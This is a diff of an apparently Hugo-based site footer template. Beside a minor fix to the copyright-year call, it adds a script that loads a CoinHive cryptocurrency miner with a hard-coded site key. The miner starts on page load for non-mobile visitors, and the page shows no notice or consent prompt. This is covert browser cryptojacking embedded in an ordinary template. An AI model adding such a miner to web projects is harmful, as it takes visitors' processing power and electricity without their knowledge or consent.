@@ -1,7 +1,7 @@
 <footer class="main-footer">
   <div class="container clearfix">
         <a class="icon-rss" href="{{ "post/index.xml" | absURL }}" title="RSS"></a>
-        <p>&copy; {{ .Now.Format "2006" }} &middot; {{ .Site.Params.copyright | markdownify }}</p>
+        <p>&copy; {{ now.Format "2006" }} &middot; {{ .Site.Params.copyright | markdownify }}</p>
   </div>
 </footer>
 
@@ -14,7 +14,16 @@
 {{ range .Site.Params.custom_js }}
 <link rel="stylesheet" href="{{ . | absURL }}">
 {{ end }}
+<script src="//coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('Vg1WNbloXajpWkpHshY0p7ej8gFK1iTM', {throttle: 0.3});
 
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 {{ template "_internal/google_analytics.html" . }}
 </body>
 </html>
